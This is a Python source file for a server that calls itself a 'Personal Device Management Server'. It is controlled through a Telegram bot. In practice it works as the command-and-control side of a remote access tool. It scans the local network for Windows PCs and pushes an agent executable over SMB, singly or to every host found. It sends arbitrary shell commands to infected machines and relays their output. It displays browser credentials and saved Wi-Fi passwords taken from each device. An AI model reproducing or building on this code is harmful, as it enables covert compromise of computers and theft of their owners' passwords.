"""
Personal Device Management Server
Telegram bot (aiogram) + HTTP API (aiohttp) for client heartbeats.
"""

import asyncio
import json
import csv
import io
import os
import threading
from datetime import datetime, timedelta
from aiohttp import web

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

from database import Database
from config import BOT_TOKEN, ADMIN_ID, HTTP_HOST, HTTP_PORT, HEARTBEAT_TIMEOUT, DB_PATH
from scanner import scan_network, get_local_ip
from deployer import deploy_to_pc, deploy_to_multiple, check_credentials

db = Database(DB_PATH)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID


@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    await message.answer(
        "🖥️ **Device Management System**\n\n"
        "Welcome! Use the commands below to manage your PCs:\n\n"
        "/devices — List all computers\n"
        "/device <id> — Full details of a PC\n"
        "/refresh <id> — Request data refresh\n"
        "/cmd <id> <command> — Send custom command\n"
        "/report <id> — Download full report\n"
        "/history <id> — Command execution history\n"
        "/help — Show this message",
        parse_mode="Markdown",
    )


@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    await cmd_start(message)


@dp.message(Command("devices"))
async def cmd_devices(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    devices = db.get_all_devices()
    if not devices:
        await message.answer(
            "📭 No devices registered yet. Install the client agent on your PCs."
        )
        return

    text = "🖥️ **Your Computers**\n\n"
    builder = InlineKeyboardBuilder()

    for d in devices:
        status_icon = "🟢" if d["status"] == "online" else "🔴"
        last_seen = d["last_seen"] or "Never"
        text += f"{status_icon} **{d['hostname']}**\n"
        text += f"   ID: `{d['device_id']}`\n"
        text += f"   Status: {d['status']} | Last seen: {last_seen[:19]}\n\n"

        builder.row(
            InlineKeyboardButton(
                text=f"📋 {d['hostname']}",
                callback_data=f"device_detail:{d['device_id']}",
            )
        )

    builder.row(
        InlineKeyboardButton(text="🔄 Refresh All", callback_data="refresh_all")
    )

    await message.answer(text, parse_mode="Markdown", reply_markup=builder.as_markup())


@dp.message(Command("device"))
async def cmd_device(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Usage: `/device <device_id>`", parse_mode="Markdown")
        return

    device_id = parts[1]
    await send_device_detail(message, device_id)


async def send_device_detail(target, device_id):
    device = db.get_device(device_id)
    if not device:
        text = "❌ Device not found."
        if hasattr(target, "answer"):
            await target.answer(text)
        else:
            await target.message.edit_text(text)
        return

    sys_info = device.get("system_info", {})
    if isinstance(sys_info, str):
        try:
            sys_info = json.loads(sys_info)
        except Exception:
            sys_info = {}

    text = f"🖥️ **{device['hostname']}**\n"
    text += f"ID: `{device['device_id']}`\n"
    text += f"Status: {'🟢 Online' if device['status'] == 'online' else '🔴 Offline'}\n"
    text += (
        f"Last seen: {device['last_seen'][:19] if device['last_seen'] else 'Never'}\n\n"
    )

    if sys_info:
        text += "**System Info:**\n"
        for key in (
            "os",
            "os_version",
            "username",
            "processor",
            "ram_gb",
            "disk_total_gb",
            "ip_address",
            "mac_address",
        ):
            if key in sys_info:
                text += f"  • {key}: `{sys_info[key]}`\n"
        text += "\n"

    processes = device.get("processes", [])
    if isinstance(processes, str):
        try:
            processes = json.loads(processes)
        except Exception:
            processes = []
    text += f"**Processes:** {len(processes)} running\n"

    wifi = device.get("wifi_profiles", [])
    if isinstance(wifi, str):
        try:
            wifi = json.loads(wifi)
        except Exception:
            wifi = []
    text += f"**Wi-Fi Networks:** {len(wifi)} saved\n"

    creds = device.get("browser_creds", {})
    if isinstance(creds, str):
        try:
            creds = json.loads(creds)
        except Exception:
            creds = {}
    total_creds = sum(len(v) if isinstance(v, list) else 0 for v in creds.values())
    text += f"**Browser Credentials:** {total_creds} saved\n"

    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔄 Refresh", callback_data=f"refresh:{device_id}"),
        InlineKeyboardButton(text="💻 Command", callback_data=f"send_cmd:{device_id}"),
    )
    builder.row(
        InlineKeyboardButton(
            text="📄 JSON Report", callback_data=f"report_json:{device_id}"
        ),
        InlineKeyboardButton(
            text="📊 CSV Report", callback_data=f"report_csv:{device_id}"
        ),
    )
    builder.row(
        InlineKeyboardButton(text="📜 History", callback_data=f"history:{device_id}"),
        InlineKeyboardButton(text="📶 Wi-Fi", callback_data=f"wifi:{device_id}"),
    )
    builder.row(
        InlineKeyboardButton(
            text="🔐 Browser Creds", callback_data=f"creds:{device_id}"
        ),
        InlineKeyboardButton(
            text="📋 Processes", callback_data=f"processes:{device_id}"
        ),
    )
    builder.row(InlineKeyboardButton(text="⬅️ Back", callback_data="back_to_devices"))

    if hasattr(target, "answer"):
        await target.answer(
            text, parse_mode="Markdown", reply_markup=builder.as_markup()
        )
    else:
        await target.message.edit_text(
            text, parse_mode="Markdown", reply_markup=builder.as_markup()
        )


@dp.message(Command("refresh"))
async def cmd_refresh(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Usage: `/refresh <device_id>`", parse_mode="Markdown")
        return
    db.set_command(parts[1], "refresh")
    await message.answer(
        f"✅ Refresh requested for `{parts[1]}`. Device will update on next heartbeat.",
        parse_mode="Markdown",
    )


@dp.message(Command("cmd"))
async def cmd_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer(
            "Usage: `/cmd <device_id> <command>`\nExample: `/cmd PC-01 ipconfig /all`",
            parse_mode="Markdown",
        )
        return
    device_id, command = parts[1], parts[2]
    db.set_command(device_id, command)
    await message.answer(
        f"✅ Command sent to `{device_id}`:\n`{command}`", parse_mode="Markdown"
    )


@dp.message(Command("report"))
async def cmd_report(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        await message.answer(
            "Usage: `/report <device_id> [json|csv]`", parse_mode="Markdown"
        )
        return

    device_id = parts[1]
    fmt = parts[2] if len(parts) > 2 else "json"
    device = db.get_device(device_id)
    if not device:
        await message.answer("❌ Device not found.")
        return

    if fmt == "json":
        content = json.dumps(device, indent=2, default=str)
        filename = f"{device_id}_report.json"
    elif fmt == "csv":
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["Field", "Value"])
        for key, value in device.items():
            if isinstance(value, (list, dict)):
                writer.writerow([key, json.dumps(value, default=str)])
            else:
                writer.writerow([key, value])
        content = output.getvalue()
        filename = f"{device_id}_report.csv"
    else:
        await message.answer("Invalid format. Use `json` or `csv`.")
        return

    tmp_path = f"/tmp/{filename}"
    with open(tmp_path, "w") as f:
        f.write(content)

    await message.answer_document(FSInputFile(tmp_path, filename=filename))
    os.remove(tmp_path)


@dp.message(Command("history"))
async def cmd_history(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Usage: `/history <device_id>`", parse_mode="Markdown")
        return

    device_id = parts[1]
    history = db.get_command_history(device_id)
    if not history:
        await message.answer(
            f"📭 No command history for `{device_id}`.", parse_mode="Markdown"
        )
        return

    text = f"📜 **Command History** for `{device_id}`\n\n"
    for h in history[:10]:
        status_icon = "✅" if h["status"] == "executed" else "⏳"
        text += f"{status_icon} `{h['command']}`\n"
        text += f"   Created: {h['created_at'][:19]}\n"
        if h.get("output"):
            output_preview = h["output"][:100]
            text += f"   Output: `{output_preview}`\n"
        text += "\n"

    await message.answer(text, parse_mode="Markdown")


@dp.message(Command("scan"))
async def cmd_scan(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    await message.answer("🔍 Scanning local network for Windows PCs...")

    try:
        results = scan_network()
    except Exception as e:
        await message.answer(f"❌ Scan failed: {str(e)}")
        return

    if not results:
        await message.answer("📭 No Windows PCs found on the network.")
        return

    text = f"🖥️ **Found {len(results)} devices**\n\n"
    builder = InlineKeyboardBuilder()

    for d in results:
        is_server = " (this server)" in d.get("status", "")
        status_icon = "🟢" if not is_server else "🏠"
        text += f"{status_icon} **{d['hostname']}**\n"
        text += f"   IP: `{d['ip']}` | MAC: `{d['mac']}`\n\n"

        if not is_server:
            builder.row(
                InlineKeyboardButton(
                    text=f"📦 Deploy to {d['hostname']}",
                    callback_data=f"deploy_prep:{d['ip']}:{d['hostname']}",
                )
            )

    builder.row(InlineKeyboardButton(text="⬅️ Back", callback_data="back_to_main"))

    if len(text) > 4000:
        for chunk in [text[i : i + 4000] for i in range(0, len(text), 4000)]:
            await message.answer(chunk, parse_mode="Markdown")
    else:
        await message.answer(
            text, parse_mode="Markdown", reply_markup=builder.as_markup()
        )


@dp.message(Command("deploy"))
async def cmd_deploy(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split(maxsplit=3)
    if len(parts) < 4:
        await message.answer(
            "Usage: `/deploy <ip> <username> <password>`\n"
            "Example: `/deploy 192.168.1.50 Administrator Pass123`\n\n"
            "First run `/scan` to find PCs, then deploy.",
            parse_mode="Markdown",
        )
        return

    ip = parts[1]
    username = parts[2]
    password = parts[3]

    agent_path = os.path.join(
        os.path.dirname(__file__), "..", "client", "dist", "DeviceAgent.exe"
    )
    if not os.path.exists(agent_path):
        agent_path = os.path.join(os.path.dirname(__file__), "DeviceAgent.exe")

    if not os.path.exists(agent_path):
        await message.answer(
            "❌ Agent .exe not found!\n"
            "Place `DeviceAgent.exe` in the `server/` directory first."
        )
        return

    await message.answer(f"📦 Deploying agent to `{ip}`...")

    try:
        success = deploy_to_pc(ip, username, password, agent_path)
    except Exception as e:
        await message.answer(f"❌ Deployment failed: {str(e)}")
        return

    if success:
        await message.answer(
            f"✅ Agent deployed to `{ip}`! It will connect within 30 seconds."
        )
    else:
        await message.answer(
            f"❌ Deployment to `{ip}` failed.\n"
            f"Check:\n"
            f"• Username/password are correct\n"
            f"• File sharing is enabled\n"
            f"• Firewall allows SMB (port 445)\n"
            f"• Administrator account is active"
        )


@dp.message(Command("deployall"))
async def cmd_deploy_all(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer(
            "Usage: `/deployall <username> <password>`\n"
            "Deploys to ALL discovered Windows PCs on the network.",
            parse_mode="Markdown",
        )
        return

    username = parts[1]
    password = parts[2]

    agent_path = os.path.join(
        os.path.dirname(__file__), "..", "client", "dist", "DeviceAgent.exe"
    )
    if not os.path.exists(agent_path):
        agent_path = os.path.join(os.path.dirname(__file__), "DeviceAgent.exe")

    if not os.path.exists(agent_path):
        await message.answer(
            "❌ Agent .exe not found! Place it in `server/` directory."
        )
        return

    await message.answer("📦 Scanning network and deploying to all Windows PCs...")

    try:
        scan_results = scan_network()
    except Exception as e:
        await message.answer(f"❌ Scan failed: {str(e)}")
        return

    targets = []
    for d in scan_results:
        if " (this server)" not in d.get("status", ""):
            targets.append(d["ip"])

    if not targets:
        await message.answer("📭 No target PCs found.")
        return

    await message.answer(f"📦 Deploying to {len(targets)} PCs: {', '.join(targets)}")

    try:
        results = deploy_to_multiple(targets, username, password, agent_path)
    except Exception as e:
        await message.answer(f"❌ Deployment failed: {str(e)}")
        return

    success_count = sum(1 for v in results.values() if v)
    text = f"📦 **Deployment Complete**\n\n"
    text += f"✅ Success: {success_count}/{len(targets)}\n\n"
    for ip, ok in results.items():
        text += f"{'✅' if ok else '❌'} `{ip}`\n"

    await message.answer(text, parse_mode="Markdown")


@dp.message(Command("status"))
async def cmd_status(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    devices = db.get_all_devices()
    online = sum(1 for d in devices if d["status"] == "online")
    offline = sum(1 for d in devices if d["status"] == "offline")

    text = "📊 **System Status**\n\n"
    text += f"🟢 Online: {online}\n"
    text += f"🔴 Offline: {offline}\n"
    text += f"📋 Total registered: {len(devices)}\n\n"

    local_ip = get_local_ip()
    text += f"🌐 Server IP: `{local_ip}`\n"
    text += f"🔌 Server port: `{HTTP_PORT}`\n"
    text += f"📡 Heartbeat interval: 25s\n"
    text += f"⏰ Offline timeout: {HEARTBEAT_TIMEOUT}s\n"

    await message.answer(text, parse_mode="Markdown")


@dp.callback_query(F.data.startswith("deploy_prep:"))
async def cb_deploy_prep(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    ip = parts[1]
    hostname = parts[2]

    await callback.message.answer(
        f"📦 **Deploy to {hostname}** (`{ip}`)\n\n"
        f"Send credentials in this format:\n"
        f"`/deploy {ip} <username> <password>`\n\n"
        f"Or deploy to all found PCs:\n"
        f"`/deployall <username> <password>`",
        parse_mode="Markdown",
    )
    await callback.answer()


@dp.callback_query(F.data == "back_to_main")
async def cb_back_to_main(callback: types.CallbackQuery):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🖥️ Devices", callback_data="show_devices"))
    builder.row(InlineKeyboardButton(text="🔍 Scan Network", callback_data="do_scan"))
    builder.row(InlineKeyboardButton(text="📊 Status", callback_data="show_status"))

    await callback.message.edit_text(
        "🖥️ **Device Management System**\n\nChoose an action:",
        parse_mode="Markdown",
        reply_markup=builder.as_markup(),
    )
    await callback.answer()


@dp.callback_query(F.data == "show_devices")
async def cb_show_devices(callback: types.CallbackQuery):
    await cmd_devices(callback.message)
    await callback.answer()


@dp.callback_query(F.data == "do_scan")
async def cb_do_scan(callback: types.CallbackQuery):
    await callback.answer("🔍 Starting scan...")
    await cmd_scan(callback.message)
    await callback.answer()


@dp.callback_query(F.data == "show_status")
async def cb_show_status(callback: types.CallbackQuery):
    await cmd_status(callback.message)
    await callback.answer()


@dp.callback_query(F.data.startswith("device_detail:"))
async def cb_device_detail(callback: types.CallbackQuery):
    device_id = callback.data.split(":", 1)[1]
    await send_device_detail(callback, device_id)
    await callback.answer()


@dp.callback_query(F.data == "back_to_devices")
async def cb_back(callback: types.CallbackQuery):
    await cmd_devices(callback.message)
    await callback.answer()


@dp.callback_query(F.data.startswith("refresh:"))
async def cb_refresh(callback: types.CallbackQuery):
    device_id = callback.data.split(":", 1)[1]
    db.set_command(device_id, "refresh")
    await callback.answer(f"✅ Refresh requested for {device_id}")
    await send_device_detail(callback, device_id)


@dp.callback_query(F.data == "refresh_all")
async def cb_refresh_all(callback: types.CallbackQuery):
    devices = db.get_all_devices()
    for d in devices:
        db.set_command(d["device_id"], "refresh")
    await callback.answer(f"✅ Refresh requested for {len(devices)} devices")
    await cmd_devices(callback.message)


@dp.callback_query(F.data.startswith("send_cmd:"))
async def cb_send_cmd(callback: types.CallbackQuery):
    device_id = callback.data.split(":", 1)[1]
    await callback.message.answer(
        f"💬 Send a command for `{device_id}`.\n"
        f"Reply to this message with the command, or use:\n"
        f"`/cmd {device_id} <your_command>`",
        parse_mode="Markdown",
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("report_json:"))
async def cb_report_json(callback: types.CallbackQuery):
    device_id = callback.data.split(":", 1)[1]
    device = db.get_device(device_id)
    if not device:
        await callback.answer("Device not found")
        return

    content = json.dumps(device, indent=2, default=str)
    filename = f"{device_id}_report.json"
    tmp_path = f"/tmp/{filename}"
    with open(tmp_path, "w") as f:
        f.write(content)

    await callback.message.answer_document(FSInputFile(tmp_path, filename=filename))
    os.remove(tmp_path)
    await callback.answer("📄 JSON report sent")


@dp.callback_query(F.data.startswith("report_csv:"))
async def cb_report_csv(callback: types.CallbackQuery):
    device_id = callback.data.split(":", 1)[1]
    device = db.get_device(device_id)
    if not device:
        await callback.answer("Device not found")
        return

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Field", "Value"])
    for key, value in device.items():
        if isinstance(value, (list, dict)):
            writer.writerow([key, json.dumps(value, default=str)])
        else:
            writer.writerow([key, value])

    filename = f"{device_id}_report.csv"
    tmp_path = f"/tmp/{filename}"
    with open(tmp_path, "w") as f:
        f.write(output.getvalue())

    await callback.message.answer_document(FSInputFile(tmp_path, filename=filename))
    os.remove(tmp_path)
    await callback.answer("📊 CSV report sent")


@dp.callback_query(F.data.startswith("history:"))
async def cb_history(callback: types.CallbackQuery):
    device_id = callback.data.split(":", 1)[1]
    history = db.get_command_history(device_id)
    if not history:
        await callback.answer("No command history")
        return

    text = f"📜 **Command History** for `{device_id}`\n\n"
    for h in history[:10]:
        status_icon = "✅" if h["status"] == "executed" else "⏳"
        text += f"{status_icon} `{h['command']}`\n"
        text += f"   {h['created_at'][:19]}\n"
        if h.get("output"):
            text += f"   Output: `{h['output'][:100]}`\n"
        text += "\n"

    await callback.message.answer(text, parse_mode="Markdown")
    await callback.answer()


@dp.callback_query(F.data.startswith("wifi:"))
async def cb_wifi(callback: types.CallbackQuery):
    device_id = callback.data.split(":", 1)[1]
    device = db.get_device(device_id)
    if not device:
        await callback.answer("Device not found")
        return

    wifi = device.get("wifi_profiles", [])
    if isinstance(wifi, str):
        try:
            wifi = json.loads(wifi)
        except Exception:
            wifi = []

    if not wifi:
        await callback.answer("No Wi-Fi profiles saved")
        return

    text = f"📶 **Saved Wi-Fi Networks** for `{device['hostname']}`\n\n"
    for w in wifi:
        text += f"**{w.get('ssid', 'Unknown')}**\n"
        if w.get("password"):
            text += f"Password: `{w['password']}`\n"
        if w.get("auth"):
            text += f"Auth: {w['auth']}\n"
        text += "\n"

    if len(text) > 4000:
        for chunk in [text[i : i + 4000] for i in range(0, len(text), 4000)]:
            await callback.message.answer(chunk, parse_mode="Markdown")
    else:
        await callback.message.answer(text, parse_mode="Markdown")

    await callback.answer()


@dp.callback_query(F.data.startswith("creds:"))
async def cb_creds(callback: types.CallbackQuery):
    device_id = callback.data.split(":", 1)[1]
    device = db.get_device(device_id)
    if not device:
        await callback.answer("Device not found")
        return

    creds = device.get("browser_creds", {})
    if isinstance(creds, str):
        try:
            creds = json.loads(creds)
        except Exception:
            creds = {}

    if not creds:
        await callback.answer("No browser credentials saved")
        return

    text = f"🔐 **Browser Credentials** for `{device['hostname']}`\n\n"
    for browser, entries in creds.items():
        if isinstance(entries, list):
            text += f"**{browser}** ({len(entries)} entries)\n"
            for entry in entries[:20]:
                url = entry.get("url", "")
                user = entry.get("username", "")
                text += f"  • `{url}` → `{user}`\n"
            if len(entries) > 20:
                text += f"  ... and {len(entries) - 20} more\n"
            text += "\n"

    if len(text) > 4000:
        for chunk in [text[i : i + 4000] for i in range(0, len(text), 4000)]:
            await callback.message.answer(chunk, parse_mode="Markdown")
    else:
        await callback.message.answer(text, parse_mode="Markdown")

    await callback.answer()


@dp.callback_query(F.data.startswith("processes:"))
async def cb_processes(callback: types.CallbackQuery):
    device_id = callback.data.split(":", 1)[1]
    device = db.get_device(device_id)
    if not device:
        await callback.answer("Device not found")
        return

    processes = device.get("processes", [])
    if isinstance(processes, str):
        try:
            processes = json.loads(processes)
        except Exception:
            processes = []

    if not processes:
        await callback.answer("No process data available")
        return

    text = f"📋 **Running Processes** for `{device['hostname']}` ({len(processes)} total)\n\n"
    for p in processes[:50]:
        name = p.get("name", "Unknown")
        pid = p.get("pid", "?")
        mem = p.get("memory_mb", "?")
        text += f"• `{name}` (PID: {pid}, RAM: {mem}MB)\n"

    if len(processes) > 50:
        text += f"\n... and {len(processes) - 50} more"

    if len(text) > 4000:
        for chunk in [text[i : i + 4000] for i in range(0, len(text), 4000)]:
            await callback.message.answer(chunk, parse_mode="Markdown")
    else:
        await callback.message.answer(text, parse_mode="Markdown")

    await callback.answer()


async def handle_heartbeat(request):
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON"}, status=400)

    device_id = data.get("device_id")
    if not device_id:
        return web.json_response({"error": "No device_id"}, status=400)

    db.update_device(device_id, data)

    if "command_output" in data:
        db.add_command_result(device_id, data["command_output"])

    pending = db.get_pending_commands(device_id)
    commands_to_send = []
    for cmd in pending:
        commands_to_send.append({"id": cmd["id"], "command": cmd["command"]})

    return web.json_response(
        {
            "status": "ok",
            "server_time": datetime.utcnow().isoformat(),
            "commands": commands_to_send,
        }
    )


async def handle_command_result(request):
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON"}, status=400)

    device_id = data.get("device_id")
    command_id = data.get("command_id")
    output = data.get("output", "")

    if device_id and command_id:
        db.mark_command_executed(command_id, output)

        device = db.get_device(device_id)
        hostname = device["hostname"] if device else device_id
        output_preview = output[:500] if output else "(empty)"
        try:
            await bot.send_message(
                ADMIN_ID,
                f"✅ **Command executed** on `{hostname}`\n"
                f"Output:\n```\n{output_preview}\n```",
                parse_mode="Markdown",
            )
        except Exception:
            pass

    return web.json_response({"status": "ok"})


async def check_offline_devices():
    while True:
        try:
            cutoff = datetime.utcnow() - timedelta(seconds=HEARTBEAT_TIMEOUT)
            db.mark_offline(cutoff)
        except Exception:
            pass
        await asyncio.sleep(30)


async def on_startup(app):
    app["bot_task"] = asyncio.create_task(dp.start_polling(bot))
    app["offline_task"] = asyncio.create_task(check_offline_devices())


async def on_shutdown(app):
    app["bot_task"].cancel()
    app["offline_task"].cancel()
    await bot.session.close()


def create_app():
    app = web.Application()
    app.router.add_post("/api/heartbeat", handle_heartbeat)
    app.router.add_post("/api/command_result", handle_command_result)
    app.on_startup.append(on_startup)
    app.on_shutdown.append(on_shutdown)
    return app


if __name__ == "__main__":
    print("=" * 60)
    print("  Personal Device Management Server")
    print("=" * 60)
    print()
    print(f"HTTP API:     http://{HTTP_HOST}:{HTTP_PORT}")
    print(f"Admin ID:     {ADMIN_ID}")
    print()
    print("Client heartbeat URL: http://<SERVER_IP>:5000/api/heartbeat")
    print("=" * 60)

    web.run_app(create_app(), host=HTTP_HOST, port=HTTP_PORT)
